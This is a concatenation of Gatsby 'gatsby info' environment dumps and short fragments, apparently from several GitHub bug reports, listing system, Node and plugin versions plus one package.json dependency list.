system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.12.0 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1573821730999-0.42525738248781186/node yarn: 1.19.1 - /var/folders/mt/71kkzssd3fq24s3x3y6wpc4h0000gn/t/yarn--1573821730999-0.42525738248781186/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 78.0.3904.97 firefox: 65.0 safari: 13.0.3
``` thanks in advance!
``` system: os: macos 10.14.5 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.17.3 - ~/.nvm/versions/node/v10.16.3/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: firefox: 70.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.17.11 => 2.17.11 gatsby-image: ^2.2.31 => 2.2.31 gatsby-plugin-feed: ^2.3.20 => 2.3.20 gatsby-plugin-google-analytics: ^2.1.25 => 2.1.25 gatsby-plugin-manifest: ^2.2.27 => 2.2.27 gatsby-plugin-offline: ^3.0.19 => 3.0.19 gatsby-plugin-react-helmet: ^3.1.14 => 3.1.14 gatsby-plugin-sharp: ^2.2.37 => 2.2.37 gatsby-plugin-typography: ^2.3.16 => 2.3.16 gatsby-remark-copy-linked-files: ^2.1.29 => 2.1.29 gatsby-remark-images: ^3.1.30 => 3.1.30 gatsby-remark-prismjs: ^3.3.22 => 3.3.22 gatsby-remark-responsive-iframe: ^2.2.26 => 2.2.26 gatsby-remark-smartypants: ^2.1.15 => 2.1.15 gatsby-source-filesystem: ^2.1.36 => 2.1.36 gatsby-transformer-remark: ^2.6.33 => 2.6.33 gatsby-transformer-sharp: ^2.3.3 => 2.3.3 npmglobalpackages: gatsby-cli: 2.8.7 gatsby-dev-cli: 2.5.36
npx gatsby info --clipboard system: os: macos 10.15.2 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.17.0 - /usr/local/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 78.0.3904.97 safari: 13.0.4 npmpackages: gatsby: ^2.13.2 => 2.17.12 gatsby-image: ^2.0.22 => 2.2.32 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-feed: ^2.0.8 => 2.3.20 gatsby-plugin-google-analytics: ^2.1.1 => 2.1.25 gatsby-plugin-manifest: ^2.0.5 => 2.2.27 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.14 gatsby-plugin-sharp: ^2.2.1 => 2.2.38 gatsby-plugin-typography: ^2.2.0 => 2.3.16 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-autolink-headers: ^2.1.0 => 2.1.17 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.29 gatsby-remark-embed-video: ^1.7.0 => 1.7.1 gatsby-remark-images: ^2.0.4 => 2.0.6 gatsby-remark-prismjs: ^3.0.0 => 3.3.22 gatsby-remark-responsive-iframe: ^2.0.5 => 2.2.26 gatsby-remark-smartypants: ^2.0.5 => 2.1.15 gatsby-source-filesystem: ^2.1.1 => 2.1.36 gatsby-transformer-remark: ^2.1.6 => 2.6.34 gatsby-transformer-sharp: ^2.1.3 => 2.3.4
``` system: os: macos 10.15.1 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.0.0 - /usr/local/bin/fish binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.19.1 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.npm-packages/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 78.0.3904.97 firefox: 70.0 safari: 13.0.3 npmpackages: gatsby: ^2.17.11 => 2.17.11 gatsby-image: ^2.2.31 => 2.2.31 gatsby-plugin-feed: ^2.3.20 => 2.3.20 gatsby-plugin-google-analytics: ^2.1.25 => 2.1.25 gatsby-plugin-manifest: ^2.2.27 => 2.2.27 gatsby-plugin-offline: ^3.0.19 => 3.0.19 gatsby-plugin-react-helmet: ^3.1.14 => 3.1.14 gatsby-plugin-sharp: ^2.2.37 => 2.2.37 gatsby-plugin-typography: ^2.3.16 => 2.3.16 gatsby-remark-copy-linked-files: ^2.1.29 => 2.1.29 gatsby-remark-images: ^3.1.30 => 3.1.30 gatsby-remark-prismjs: ^3.3.22 => 3.3.22 gatsby-remark-responsive-iframe: ^2.2.26 => 2.2.26 gatsby-remark-smartypants: ^2.1.15 => 2.1.15 gatsby-source-filesystem: ^2.1.36 => 2.1.36 gatsby-transformer-remark: ^2.6.33 => 2.6.33 gatsby-transformer-sharp: ^2.3.3 => 2.3.3 npmglobalpackages: gatsby-cli: 2.8.9
you wouldn't need this to reproduce
``` system: os: macos 10.15 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.6.0 - /usr/local/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: safari: 13.0.1 npmpackages: gatsby: ^2.15.34 => 2.15.34 gatsby-image: ^2.2.20 => 2.2.24 gatsby-plugin-breadcrumb: ^3.2.1 => 3.2.1 gatsby-plugin-feed: ^2.3.13 => 2.3.15 gatsby-plugin-google-analytics: ^2.1.17 => 2.1.20 gatsby-plugin-manifest: ^2.2.18 => 2.2.20 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-mdx: ^1.0.49 => 1.0.49 gatsby-plugin-offline: ^3.0.8 => 3.0.12 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-remove-trailing-slashes: ^2.1.7 => 2.1.9 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sass: ^2.1.15 => 2.1.17 gatsby-plugin-sharp: ^2.2.25 => 2.2.28 gatsby-plugin-sitemap: ^2.2.14 => 2.2.16 gatsby-remark-autolink-headers: ^2.1.11 => 2.1.13 gatsby-remark-copy-linked-files: ^2.1.20 => 2.1.25 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.23 => 3.1.25 gatsby-remark-prismjs: ^3.3.14 => 3.3.17 gatsby-remark-responsive-iframe: ^2.2.17 => 2.2.22 gatsby-remark-smartypants: ^2.1.9 => 2.1.11 gatsby-source-filesystem: ^2.1.26 => 2.1.30 gatsby-source-git: ^1.0.2 => 1.0.2 gatsby-source-graphql: ^2.1.21 => 2.1.21 gatsby-transformer-remark: ^2.6.24 => 2.6.27 gatsby-transformer-sharp: ^2.2.16 => 2.2.20 npmglobalpackages: gatsby-cli: 2.7.40
system: os: macos 10.15.1 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.12.1 - ~/.npm-packages/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 78.0.3904.97 firefox: 66.0.5 safari: 13.0.3 npmpackages: gatsby: ^2.17.2 => 2.17.2 gatsby-cli: ^2.8.5 => 2.8.5 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-sass: ^2.1.20 => 2.1.20 gatsby-plugin-sharp: ^2.2.32 => 2.2.32 gatsby-plugin-styled-components: ^3.1.11 => 3.1.11 gatsby-plugin-typography: ^2.3.15 => 2.3.15 gatsby-source-drupal: ^3.3.0 => 3.3.0 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-transformer-sharp: ^2.3.0 => 2.3.0 npmglobalpackages: gatsby-cli: 2.8.0
from the minified environment:
``` system: os: linux 5.3 fedora 30 (workstation edition) 30 (workstation edition) cpu: (4) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 10.16.3 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 78.0.3904.70 firefox: 70.0 npmpackages: gatsby: ^2.1.31 => 2.17.7 gatsby-image: ^2.0.33 => 2.2.30 gatsby-mdx: ^0.4.3 => 0.4.5 gatsby-plugin-manifest: ^2.0.24 => 2.2.26 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.9 => 3.1.13 gatsby-plugin-sharp: ^2.0.28 => 2.2.36 gatsby-plugin-styled-components: ^3.0.7 => 3.1.11 gatsby-plugin-typescript: ^2.0.11 => 2.1.15 gatsby-remark-prismjs: ^3.2.5 => 3.3.20 gatsby-source-filesystem: ^2.0.24 => 2.1.35 gatsby-transformer-remark: ^2.3.2 => 2.6.32 gatsby-transformer-sharp: ^2.1.17 => 2.3.2 npmglobalpackages: gatsby-cli: 2.8.5
``` system: os: macos 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - /usr/local/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.11.3 - ~/.npm-global/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.87 firefox: 70.0 safari: 13.0.3 npmpackages: gatsby: ^2.1.20 => 2.17.7 gatsby-cli: ^2.4.5 => 2.8.8 gatsby-image: ^2.0.26 => 2.2.30 gatsby-link: ^2.0.12 => 2.2.22 gatsby-plugin-google-tagmanager: ^2.0.6 => 2.1.15 gatsby-plugin-mdx: ^1.0.14 => 1.0.55 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.13 gatsby-plugin-react-helmet-canonical-urls: ^1.2.0 => 1.3.0 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-remove-trailing-slashes: ^2.0.9 => 2.1.12 gatsby-plugin-robots-txt: ^1.3.0 => 1.5.0 gatsby-plugin-sitemap: ^2.0.1 => 2.2.19 gatsby-plugin-styled-components: ^3.0.0 => 3.1.11 gatsby-plugin-typescript: ^2.0.3 => 2.1.15 gatsby-source-apiserver: ^2.0.0 => 2.1.3 gatsby-source-filesystem: ^2.0.1 => 2.1.35 gatsby-transformer-csv: ^2.0.4 => 2.1.15 gatsby-transformer-javascript-frontmatter: ^2.0.0 => 2.1.16 gatsby-transformer-json: ^2.1.2 => 2.2.16 ```
``` system: os: windows 10 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: npm: 6.4.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 - /c/python27/python browsers: edge: 44.18362.387.0 npmpackages: gatsby: ^2.17.6 => 2.17.6 gatsby-image: ^2.2.30 => 2.2.30 gatsby-plugin-manifest: ^2.2.25 => 2.2.25 gatsby-plugin-netlify: ^2.1.23 => 2.1.23 gatsby-plugin-nprogress: ^2.1.12 => 2.1.12 gatsby-plugin-offline: ^3.0.17 => 3.0.17 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.2.34 => 2.2.34 gatsby-plugin-sitemap: ^2.2.19 => 2.2.19 gatsby-source-filesystem: ^2.1.35 => 2.1.35 gatsby-transformer-sharp: ^2.3.1 => 2.3.1 ```
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 78.0.3904.70 firefox: 69.0.1 safari: 13.0.3 npmpackages: gatsby: 2.17.6 => 2.17.6 gatsby-plugin-sharp: 2.2.36 => 2.2.36 gatsby-source-filesystem: 2.1.35 => 2.1.35 gatsby-transformer-sharp: 2.3.2 => 2.3.2
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 12.9.0 - ~/.nvm/versions/node/v12.9.0/bin/node npm: 6.10.2 - ~/.nvm/versions/node/v12.9.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.70 firefox: 68.2.0 safari: 13.0.3 npmpackages: gatsby: ^2.17.0 => 2.17.0 gatsby-link: ^2.2.22 => 2.2.22 gatsby-plugin-emotion: ^2.0.7 => 2.0.7 gatsby-plugin-layout: ^1.1.13 => 1.1.13 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-transformer-json: ^2.2.15 => 2.2.15 gatsby-transformer-react-docgen: ^4.0.1 => 4.1.3
unfortunately this is a large internal project and i'm not able to share a repo
if there are particular config files that it would be helpful to share i probably can
i understand i'm not providing a ton to go on and this may be related to some non-standard thing i'm doing
i'd appreciate any pointers to help me debug this myself though
thanks for the help and for gatsby, i love using it!
note: modified gatsby to resolve bug stated in #19191 ``` system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (8) x64 06/8e shell: 5.3.1 - /usr/bin/zsh binaries: node: 13.0.1 - /usr/bin/node yarn: 1.19.1 - /usr/bin/yarn npm: 6.12.0 - /usr/bin/npm languages: python: 2.7.13 - /usr/bin/python browsers: firefox: 60.9.0 npmpackages: gatsby: ^2.17.6 => 2.17.6 gatsby-image: ^2.2.30 => 2.2.30 gatsby-plugin-manifest: ^2.2.25 => 2.2.25 gatsby-plugin-offline: ^3.0.17 => 3.0.17 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.2.34 => 2.2.34 gatsby-source-filesystem: ^2.1.35 => 2.1.35 gatsby-transformer-sharp: ^2.3.1 => 2.3.1
``` system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (8) x64 06/8e shell: 5.3.1 - /usr/bin/zsh binaries: node: 13.0.1 - /usr/bin/node yarn: 1.19.1 - /usr/bin/yarn npm: 6.12.0 - /usr/bin/npm languages: python: 2.7.13 - /usr/bin/python browsers: firefox: 60.9.0 npmpackages: gatsby: ^2.17.6 => 2.17.6 gatsby-image: ^2.2.30 => 2.2.30 gatsby-plugin-manifest: ^2.2.25 => 2.2.25 gatsby-plugin-offline: ^3.0.17 => 3.0.17 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-schema-snapshot: ^1.0.0 => 1.0.0 gatsby-plugin-sharp: ^2.2.34 => 2.2.34 gatsby-source-filesystem: ^2.1.35 => 2.1.35 gatsby-transformer-sharp: ^2.3.1 => 2.3.1
``` system: os: macos 10.15 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.1 - ~/.nvm/versions/node/v10.16.1/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.10.2 - ~/.nvm/versions/node/v10.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 78.0.3904.70 safari: 13.0.2 npmglobalpackages: gatsby-dev-cli: 2.5.7
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4980hq cpu @ 2.80ghz shell: 3.0.2 - /usr/local/bin/fish binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.17.3 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.70 firefox: 69.0.3 safari: 13.0.2 npmpackages: gatsby: ^2.15.28 => 2.15.28 gatsby-background-image: ^0.8.15 => 0.8.15 gatsby-image: ^2.2.23 => 2.2.23 gatsby-plugin-eslint: ^2.0.5 => 2.0.5 gatsby-plugin-mdx: ^1.0.46 => 1.0.46 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-sharp: ^2.2.27 => 2.2.27 gatsby-plugin-sitemap: ^2.1.0 => 2.1.0 gatsby-plugin-styled-components: ^3.1.8 => 3.1.8 gatsby-remark-prismjs: ^3.3.16 => 3.3.16 gatsby-remark-smartypants: ^2.1.11 => 2.1.11 gatsby-source-contentful: ^2.1.44 => 2.1.44 gatsby-source-filesystem: ^2.0.32 => 2.0.32 gatsby-source-git: ^1.0.2 => 1.0.2 gatsby-source-rss-feed: ^1.1.1 => 1.1.1 gatsby-transformer-remark: ^2.6.26 => 2.6.26 gatsby-transformer-sharp: ^2.2.19 => 2.2.19 ```
nb: also happens on my windows machine
``` system: os: macos 10.15 cpu: (4) x64 intel(r) core(tm) i5-4260u cpu @ 1.40ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - /usr/local/bin/node npm: 6.12.0 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 77.0.3865.120 safari: 13.0.2 npmpackages: gatsby: ^2.16.3 => 2.16.3 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-google-adsense: ^1.1.3 => 1.1.3 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.0.16 => 3.0.16 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-remove-console: 0.0.2 => 0.0.2 gatsby-plugin-sharp: ^2.2.31 => 2.2.31 gatsby-remark-images: ^3.1.28 => 3.1.28 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-theme-material-ui: ^1.0.5 => 1.0.5 gatsby-transformer-remark: ^2.6.30 => 2.6.30 gatsby-transformer-sharp: ^2.2.23 => 2.2.23 npmglobalpackages: gatsby-cli: 2.8.5
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.19.1 - ~/.nvm/versions/node/v10.15.3/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3865.120 firefox: 69.0 safari: 13.0.2 npmpackages: gatsby: ^2.17.4 => 2.17.4 gatsby-image: ^2.2.29 => 2.2.29 gatsby-plugin-manifest: ^2.2.23 => 2.2.23 gatsby-plugin-offline: ^3.0.16 => 3.0.16 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.13 gatsby-plugin-sharp: ^2.2.32 => 2.2.32 gatsby-source-filesystem: ^2.1.33 => 2.1.33 gatsby-transformer-sharp: ^2.3.0 => 2.3.0
``` ## related issues #18604 #17980
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i7-5500u cpu @ 2.40ghz binaries: yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.5.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.11 - c:\\python27\\python.exe browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.13.41 => 2.13.41 gatsby-image: ^2.2.7 => 2.2.7 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.2 => 3.1.2 gatsby-plugin-sass: ^2.1.3 => 2.1.3 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-plugin-typescript: ^2.1.2 => 2.1.2 gatsby-source-filesystem: ^2.1.6 => 2.1.6 gatsby-transformer-sharp: ^2.2.4 => 2.2.4
i reproduced the error on a throwaway vm and reverted my dev machine back to its last working state, hence posting the vm stats here
system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (1) x64 intel(r) xeon(r) cpu @ 2.00ghz shell: 5.0.3 - /bin/bash
binaries: node: 13.0.1 - ~/.nvm/versions/node/v13.0.1/bin/node npm: 6.12.0 - ~/.nvm/versions/node/v13.0.1/bin/npm
languages: python: 2.7.16 - /usr/bin/python
npmglobalpackages: gatsby-cli: 2.8.5
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /var/folders/b4/9fxc67bd6vn14sd5g8czvnjw0000gn/t/yarn--1571755737632-0.1316673615401729/node yarn: 1.17.3 - /var/folders/b4/9fxc67bd6vn14sd5g8czvnjw0000gn/t/yarn--1571755737632-0.1316673615401729/yarn npm: 6.4.1 - ~/.nodenv/versions/10.15.3/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3865.120 firefox: 65.0 safari: 12.1.2 npmpackages: gatsby: ^2.15.29 => 2.15.29 gatsby-image: ^2.2.23 => 2.2.23 gatsby-link: ^2.2.17 => 2.2.18 gatsby-plugin-catch-links: ^2.1.12 => 2.1.12 gatsby-plugin-feed: ^2.3.15 => 2.3.15 gatsby-plugin-google-tagmanager: ^2.1.12 => 2.1.12 gatsby-plugin-manifest: ^2.2.20 => 2.2.20 gatsby-plugin-offline: ^3.0.11 => 3.0.11 gatsby-plugin-postcss: ^2.1.10 => 2.1.10 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-react-helmet-canonical-urls: ^1.2.0 => 1.2.0 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.2.27 => 2.2.27 gatsby-plugin-sitemap: ^2.2.16 => 2.2.16 gatsby-plugin-twitter: ^2.1.9 => 2.1.9 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-images-contentful: ^2.1.17 => 2.1.17 gatsby-source-contentful: ^2.1.44 => 2.1.44 gatsby-transformer-remark: ^2.6.26 => 2.6.26
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.10.3 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 77.0.3865.120 firefox: 69.0 safari: 13.0.2 npmpackages: gatsby: ^2.15.29 => 2.15.29 gatsby-image: ^2.2.24 => 2.2.24 gatsby-plugin-google-analytics: ^2.1.20 => 2.1.20 gatsby-plugin-manifest: ^2.2.20 => 2.2.20 gatsby-plugin-netlify: ^2.1.17 => 2.1.17 gatsby-plugin-offline: ^3.0.11 => 3.0.11 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.10 gatsby-plugin-sharp: ^2.2.28 => 2.2.28 gatsby-plugin-sitemap: ^2.2.16 => 2.2.16 gatsby-plugin-styled-components: ^3.1.8 => 3.1.8 gatsby-plugin-typescript: ^2.1.11 => 2.1.11 gatsby-source-contentful: ^2.1.45 => 2.1.45 gatsby-source-filesystem: ^2.1.29 => 2.1.29 gatsby-transformer-inline-svg: ^0.0.1 => 0.0.1 gatsby-transformer-sharp: ^2.2.20 => 2.2.20
``` ### related issues #11194 #2954
```shell script
$ gatsby info --clipboard system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.0.7 - /usr/local/bin/bash binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /users/pauleveritt/.pyenv/shims/python browsers: chrome: 78.0.3904.63 firefox: 70.0 safari: 13.0.2 npmpackages: gatsby: ^2.13.50 => 2.15.34 gatsby-plugin-mdx: ^1.0.0 => 1.0.50 gatsby-source-filesystem: ^2.1.8 => 2.1.31 npmglobalpackages: gatsby-cli: 2.7.57 gatsby: 2.0.28
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - /usr/local/bin/node npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.120 firefox: 69.0.3 safari: 13.0.2 npmpackages: gatsby: ^2.15.16 => 2.15.16 gatsby-image: ^2.2.20 => 2.2.20 gatsby-plugin-create-client-paths: ^2.1.12 => 2.1.12 gatsby-plugin-manifest: ^2.2.16 => 2.2.16 gatsby-plugin-offline: ^3.0.7 => 3.0.7 gatsby-plugin-preload-fonts: ^1.0.14 => 1.0.14 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.7 gatsby-plugin-sharp: ^2.2.22 => 2.2.22 gatsby-plugin-styled-components: ^3.1.8 => 3.1.8 gatsby-plugin-transition-link: ^1.13.0 => 1.13.0 gatsby-source-filesystem: ^2.1.26 => 2.1.26 gatsby-transformer-json: ^2.2.9 => 2.2.9 gatsby-transformer-sharp: ^2.2.14 => 2.2.14 npmglobalpackages: gatsby-cli: 2.7.47
node v10.16.3
npm 6.9.0 package.json: ``` "dependencies": { "axios": "0.19.0", "gatsby": "2.13.50", "gatsby-image": "2.2.8", "gatsby-plugin-env-variables": "1.0.1", "gatsby-plugin-google-analytics": "2.1.21", "gatsby-plugin-google-tagmanager": "2.1.13", "gatsby-plugin-intl": "0.2.8", "gatsby-plugin-manifest": "2.2.4", "gatsby-plugin-offline": "2.2.4", "gatsby-plugin-postcss": "2.1.4", "gatsby-plugin-react-helmet": "3.1.3", "gatsby-plugin-react-svg": "2.1.2", "gatsby-plugin-sass": "2.1.8", "gatsby-plugin-sharp": "2.2.9", "gatsby-plugin-typescript": "2.1.2", "gatsby-source-filesystem": "2.1.8", "gatsby-transformer-sharp": "2.2.5", "graphql": "14.4.2", "node-sass": "4.12.0", "prop-types": "15.7.2", "query-string": "5.1.1", "react": "16.8.6", "react-dom": "16.8.6", "react-google-login": "5.0.5", "react-helmet": "5.2.1", "react-recaptcha-v3": "1.1.0", "react-simple-keyboard": "2.0.4", "react-transition-group": "4.2.2", "ts-optchain": "0.1.8" }, "devdependencies": { "@babel/core": "7.5.5", "@babel/plugin-proposal-optional-chaining": "7.6.0", "@graphql-codegen/cli": "1.4.0", "@graphql-codegen/typescript": "1.4.0", "@graphql-codegen/typescript-operations": "1.4.0", "@types/aws-sdk": "2.7.0", "@types/facebook-js-sdk": "3.3.0", "@types/node": "12.6.9", "@types/react-dom": "16.8.5", "@types/react-helmet": "5.0.8", "@types/react-intl": "2.3.18", "@typescript-eslint/eslint-plugin": "2.0.0", "@typescript-eslint/parser": "1.13.0", "eslint": "6.1.0", "eslint-config-prettier": "6.0.0", "eslint-plugin-react": "7.14.2", "postcss-pxtorem": "4.0.1", "prettier": "1.18.2", "prettier-tslint": "0.4.2", "resolve-url-loader": "3.1.0", "typescript": "3.5.3" },
$ gatsby info --clipboard system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - ~/.nvm/versions/node/v10.16.0/bin/node yarn: 1.17.3 - ~/.nvm/versions/node/v10.16.0/bin/yarn npm: 6.10.1 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 77.0.3865.120 firefox: 67.0.2 safari: 13.0.2 npmpackages: gatsby: 2.13.50 => 2.13.50 gatsby-image: 2.2.8 => 2.2.8 gatsby-plugin-env-variables: 1.0.1 => 1.0.1 gatsby-plugin-google-analytics: 2.1.21 => 2.1.21 gatsby-plugin-google-tagmanager: 2.1.13 => 2.1.13 gatsby-plugin-intl: 0.2.8 => 0.2.8 gatsby-plugin-manifest: 2.2.4 => 2.2.4 gatsby-plugin-offline: 2.2.4 => 2.2.4 gatsby-plugin-postcss: 2.1.4 => 2.1.4 gatsby-plugin-react-helmet: 3.1.3 => 3.1.3 gatsby-plugin-react-svg: 2.1.2 => 2.1.2 gatsby-plugin-sass: 2.1.8 => 2.1.8 gatsby-plugin-sharp: 2.2.9 => 2.2.9 gatsby-plugin-typescript: 2.1.2 => 2.1.2 gatsby-source-filesystem: 2.1.8 => 2.1.8 gatsby-transformer-sharp: 2.2.5 => 2.2.5 npmglobalpackages: gatsby-cli: 2.7.58
